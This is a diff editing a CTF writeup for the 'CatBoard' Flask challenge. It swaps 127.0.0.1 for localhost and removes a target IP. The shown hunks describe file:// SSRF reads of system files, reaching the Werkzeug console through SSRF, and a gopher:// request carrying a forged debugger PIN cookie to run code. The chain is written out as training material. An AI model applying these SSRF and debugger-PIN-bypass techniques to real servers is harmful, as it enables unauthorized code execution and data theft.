@@ -6,13 +6,11 @@ tags:
 
 # CatBoard — CTF Web Challenge Writeup
 
-**Category:** Web
 
 ## Challenge Overview
 
-**Target:** `http://52.59.124.14:5004`  
 **Flag format:** `ENO{...}`  
-**Category:** Web — SSRF, Session Forgery, Werkzeug Debugger PIN Bypass
+**Focus:** SSRF, Session Forgery, Werkzeug Debugger PIN Bypass
 
 The challenge presents "CatBoard," a cat image gallery built with Flask. The source code (`app.py`) is provided but fully obfuscated — every Python keyword, identifier, and string literal has been replaced with variations of "meow" (`mew`, `meow`, `meoow`, `meeeow`, etc.).
 
@@ -89,7 +87,7 @@ Using `file://` SSRF, I read critical system files:
 | `/proc/self/environ` | `FLASK_APP=app.py`, `FLASK_DEBUG=1`, `HOME=/home/ctfplayer`, `WERKZEUG_RUN_MAIN=true` |
 | `/proc/self/cgroup` | `0::/` |
 | `/proc/self/mountinfo` | Docker container ID: `9ef8e4a5e852...` |
-| `/proc/self/net/tcp` | Listening on `0.0.0.0:5000` (internal) |
+| `/proc/self/net/tcp` | Listening on all interfaces on port `5000` |
 
 ### Key Discoveries
 
@@ -105,7 +103,7 @@ Using `file://` SSRF, I read critical system files:
 The Werkzeug debugger console at `/console` is blocked by the custom middleware for external requests. However, **SSRF from localhost bypasses the IP check** (the middleware only blocks non-private IPs):
 
 ```
-POST /fetch  url=http://127.0.0.1:5000/console
+POST /fetch  url=http://localhost:5000/console
 → 200 OK — Full Werkzeug console page!
 ```
 
@@ -173,10 +171,10 @@ Since pycurl supports `gopher://`, I could craft raw HTTP requests with arbitrar
 
 ```
 1. Visit /console via SSRF (creates frame 0)
-   POST /fetch  url=http://127.0.0.1:5000/console
+   POST /fetch  url=http://localhost:5000/console
 
 2. Execute code via gopher:// with forged PIN cookie
-   POST /fetch  url=gopher://127.0.0.1:5000/_GET%20/__debugger__?...
+   POST /fetch  url=gopher://localhost:5000/_GET%20/__debugger__?...
    (with Cookie header containing the forged PIN cookie)
 ```
 
@@ -184,7 +182,7 @@ The gopher payload constructs a raw HTTP GET request to `/__debugger__` with our
 
 ```
 GET /__debugger__?__debugger__=yes&cmd=<PYTHON_CODE>&frm=0&s=<SECRET> HTTP/1.1
-Host: 127.0.0.1:5000
+Host: localhost:5000
 Cookie: __wzd8fe6343c0faf4f031d62=1738959726|446325dec3ec
 Connection: close
 ```
@@ -212,7 +210,7 @@ Access /fetch admin endpoint → SSRF via pycurl
          ↓
 file:// reads → Leak machine-id, MAC, username, container ID
          ↓
-SSRF to http://127.0.0.1:5000/console → Get debugger SECRET + create frame 0
+SSRF to http://localhost:5000/console → Get debugger SECRET + create frame 0
          ↓
 Compute Werkzeug PIN + forge PIN auth cookie
          ↓
